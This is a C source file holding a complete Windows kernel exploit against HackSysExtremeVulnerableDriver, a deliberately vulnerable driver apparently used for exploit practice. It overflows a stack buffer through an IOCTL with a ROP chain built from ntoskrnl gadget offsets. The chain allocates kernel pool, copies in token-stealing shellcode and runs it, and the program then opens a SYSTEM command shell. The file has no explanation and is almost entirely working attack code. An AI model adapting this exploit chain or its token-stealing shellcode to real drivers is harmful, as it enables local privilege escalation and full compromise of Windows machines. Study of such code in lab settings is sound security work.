#include <windows.h>
#include <psapi.h>
#include <stdio.h>

UINT64 GetKernelBase()
{
	LPVOID pImageBase = NULL;
	DWORD dwSizeNeeded = 0;
	EnumDeviceDrivers(&pImageBase, sizeof(pImageBase), &dwSizeNeeded);
	return (UINT64)pImageBase;
}

int main(int argc, char* argv[])
{
	HANDLE hDevice = INVALID_HANDLE_VALUE;
	DWORD dwBytesReturned = 0;
	DWORD dwControlCode = 0x222003;
	DWORD Offset = 2072;
	CHAR szDriverName[] = "\\\\.\\HackSysExtremeVulnerableDriver";
	UINT64 KernelBase = GetKernelBase();
	UCHAR InBuffer[4096] = { 0 };

	// steal SYSTEM token, do fancy return tricks to get back to userland without crashing
	UCHAR Shellcode[] = "\x65\x48\x8b\x04\x25\x88\x01\x00\x00\x48\x8b\x80\xb8\x00\x00\x00\x49\x89\xc0\x4d\x8b\x80\x48\x04\x00\x00\x49\x81\xe8\x48\x04\x00\x00\x4d\x8b\x88\x40\x04\x00\x00\x49\x83\xf9\x04\x75\xe5\x49\x8b\x88\xb8\x04\x00\x00\x80\xe1\xf0\x48\x89\x88\xb8\x04\x00\x00\x65\x48\x8b\x04\x25\x88\x01\x00\x00\x66\x8b\x88\xe4\x01\x00\x00\x66\xff\xc1\x66\x89\x88\xe4\x01\x00\x00\x48\x8b\x90\x90\x00\x00\x00\x48\x8b\x8a\x68\x01\x00\x00\x4c\x8b\x9a\x78\x01\x00\x00\x48\x8b\xa2\x80\x01\x00\x00\x48\x8b\xaa\x58\x01\x00\x00\x31\xc0\x0f\x01\xf8\x48\x0f\x07";
	
	RtlFillMemory(InBuffer, Offset, 'A');

	UINT64 Stack[] = {
		// ExAllocatePoolWithTag(0, 0x1000, 0x41414141);
		KernelBase + 0x38f1d3,          // xor ecx, ecx; mov rax, rcx; ret;
		KernelBase + 0x7d04d2,          // pop rdx; ret;
		0x1000,                         // bytes to allocate
		KernelBase + 0x8a0a19,          // pop r8; ret;
		0x41414141,                     // tag 'AAAA'
		KernelBase + 0x9b7010,          // &ExAllocatePoolWithTag

		// memcpy(rax, Shellcode, sizeof(Shellcode));
		KernelBase + 0x59f1f5,          // mov r8, rax; mov rax, r8; add rsp, 0x28; ret;
		0x4141414141414141,             // 0x28 of padding
		0x4141414141414141,
		0x4141414141414141,
		0x4141414141414141,
		0x4141414141414141,
		KernelBase + 0x93fe5a,          // mov rcx, r8; mov rax, rcx; ret;
		KernelBase + 0x7d04d2,          // pop rdx; ret;
		(UINT64)Shellcode,              // userland shellcode buffer
		KernelBase + 0x8a0a19,          // pop r8; ret;
		(UINT64)sizeof(Shellcode) - 1,  // size of shellcode
		KernelBase + 0x411040,          // &memcpy

		// jump to kernel buffer
		KernelBase + 0xa1a33f,          // jmp rax;
	};

	for (DWORD i = 0; i < ARRAYSIZE(Stack); i++, Offset += sizeof(UINT64))
		*(UINT64*)(InBuffer + Offset) = Stack[i];

	hDevice = CreateFileA(szDriverName, FILE_GENERIC_READ | FILE_GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	DeviceIoControl(hDevice, dwControlCode, InBuffer, Offset, 0, 0, &dwBytesReturned, NULL);

	system("cmd");

	return 0;
}
